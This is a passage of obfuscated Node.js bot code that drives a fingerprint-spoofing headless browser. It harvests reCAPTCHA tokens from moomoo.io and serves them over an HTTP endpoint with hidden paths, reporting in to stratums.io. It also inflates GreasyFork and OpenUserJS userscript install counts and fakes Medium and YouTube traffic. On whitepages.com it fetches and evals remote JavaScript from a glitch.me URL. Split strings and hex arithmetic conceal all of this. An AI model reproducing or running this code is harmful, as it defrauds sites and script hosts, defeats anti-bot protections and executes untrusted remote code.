      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + X(0x8) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': X(0x3) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + X(0x9) + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + X(0xd) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    W(0x6, '0yf8') + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    W(0xb, 'Pg%#') + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + W(0x0, '0MyM') + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1548 + 0x73c + -0x4 * 0x721
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x9 * -0x1d3 + 0x314 * -0x6 + -0x1 * -0x22e3)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + Z(0xe) + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1 * 0x670 + -0x1 * 0x192d + 0x2001), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x6c * -0x25 + 0x262a + -0x162a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x124d + -0x28 * -0xf2 + -0x1383;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x819 * -0x2 + -0x1725 + -0x1 * -0x6f3; w < getRandomInt(-0x33e * 0x1 + 0x49 * -0x31 + -0x89c * -0x2, 0xc82 + -0x1650 + 0x9d3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x153a3 + 0x107a7 + -0x170ea);
        }
      }();
    }, 0x83 * 0x2e + 0x1d86 + 0x34ac * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1c60 + -0x1 * 0x482 + 0x20e2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x5d7 + 0x20bb + -0x2692, -0x1482 + 0x1ac7 + -0x137 * 0x5)), !z['includes']('isMoomooIo'))
          return await y[a0(0x1a)](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xbead + -0x1 * 0xcbe3 + 0x2 * 0x4133);
    }, 0x2130 + -0x155a + -0xa * 0x125), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0xe * -0x22a + -0x235 * -0xb + 0x605;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2d * 0xa + -0x36 * 0x1b + 0x2 * 0x996), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x1 * -0x347 + 0x1232 + 0x43 * -0x39), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1b2f29 + -0x13256e + 0xd891 * 0x47);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1 * 0x148b + -0x1 * -0xa1d + -0x34 * 0x95);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xb39 + 0x2 * 0x989 + -0x711);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x69 * 0x9 + 0x12e5 + -0x3 * -0x2fe);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = c,
    a4 = b;
  async function f() {
    const a3 = b,
      a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xfe * -0x1e + 0x8b * 0x27 + 0x32f0 * -0x1) {
        const a1 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x172a + -0xa44 + 0x3b7 * 0x9));
        const C = A['indexOf']('Chrome/') + 'Chrome/' [a1(0x13)],
          D = A['slice'](C),
          E = D['slice'](0x261 * -0xb + -0x1443 + 0x2e6e, D['indexOf']('\x20'));
        return B ? E['slice'](-0xd * 0x187 + -0x1 * -0x305 + -0x10d6 * -0x1, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xf51 * 0x5 + 0x288b * 0x1 + -0x4e10),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + a2(0x7) + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x408e + 0x242 * 0x17 + 0x33b0),
      'headers': {
        'host': a3(0x5, 'aa5)') + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': a3(0xf, '4UDc'),
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + a4(0x4, '0MyM') + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + a5(0x14) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x35c + -0xfc8 + 0x109 * 0xc; k < 0x110c + -0xfb * -0x6 + 0x16ea * -0x1; k++)
    setTimeout(f, (0x1b43e + -0x180f5 + 0xb717) * k * getRandomInt(-0x1b0f + 0xbdc + 0xf34, -0x25e2 + 0x2670 + -0x8b * 0x1));
  setInterval(() => {
    f();
    for (let l = -0x1a7 * -0x17 + -0xb49 * 0x3 + -0x162 * 0x3; l < 0x118a + 0x15 * -0x1 + -0x1171; l++)
      setTimeout(f, (-0x89e7 * 0x1 + 0x9 * 0x3119 + 0x459a * -0x1) * l * getRandomInt(-0x1 * -0x18c2 + 0x239 * -0xf + 0x896, 0x134 * 0xd + 0xd74 + -0x5 * 0x5d1));
  }, 0x313 * 0xc2e + -0x2 * 0x2beb1e + 0x695352);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
